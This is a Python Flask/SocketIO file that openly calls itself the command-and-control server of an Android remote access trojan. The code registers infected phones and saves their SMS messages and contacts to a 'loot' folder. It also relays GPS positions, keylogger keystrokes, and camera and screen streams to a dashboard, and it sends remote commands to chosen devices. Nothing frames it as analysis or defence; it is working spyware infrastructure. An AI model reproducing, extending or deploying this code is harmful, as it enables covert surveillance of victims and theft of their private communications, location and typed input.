from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import json
import os
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_rat_key'
socketio = SocketIO(app, cors_allowed_origins="*")

# Crear carpeta para "Botín" (Datos robados)
if not os.path.exists('loot'):
    os.makedirs('loot')

agents = {}

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    print(f"⚡ Nueva conexión: {request.sid}")

@socketio.on('register-agent')
def handle_register(data):
    agents[request.sid] = data
    emit('update-agent-list', agents, broadcast=True)

# --- MANEJO DE DATOS SEGÚN PERMISOS ---

@socketio.on('data-gps') # Permiso: ACCESS_FINE_LOCATION
def handle_gps(data):
    print(f"📍 GPS Recibido: {data}")
    emit('dashboard-log', f"📍 GPS: Lat {data.get('lat')}, Lon {data.get('lon')}", broadcast=True)

@socketio.on('data-sms') # Permiso: READ_SMS
def handle_sms(data):
    filename = f"loot/sms_{request.sid}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)
    emit('dashboard-log', f"📩 SMS Volcados: {len(data)} mensajes guardados.", broadcast=True)

@socketio.on('data-contacts') # Permiso: READ_CONTACTS
def handle_contacts(data):
    filename = f"loot/contacts_{request.sid}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)
    emit('dashboard-log', f"📇 Contactos extraídos: {len(data)} guardados.", broadcast=True)

@socketio.on('data-keylogger') # Permiso: ACCESSIBILITY_SERVICE
def handle_keys(data):
    # Esto llega en tiempo real, letra por letra o palabras
    emit('dashboard-log', f"⌨️ Tecla: {data.get('key')}", broadcast=True)

# --- STREAMING (Cámara/Pantalla/Audio) ---

@socketio.on('stream-frame') # Permiso: CAMERA / MEDIA_PROJECTION
def handle_stream(data):
    # Reenvía la imagen base64 al dashboard
    emit('update-monitor', data, broadcast=True)

@socketio.on('control-command')
def send_command(data):
    target_id = data.get('target')
    command = data.get('command')
    # Enviar comando al socket específico del Android
    emit('command', command, to=target_id)

if __name__ == '__main__':
    print("🔥 Servidor RAT iniciado en puerto 5000")
    socketio.run(app, host='0.0.0.0', port=5000)
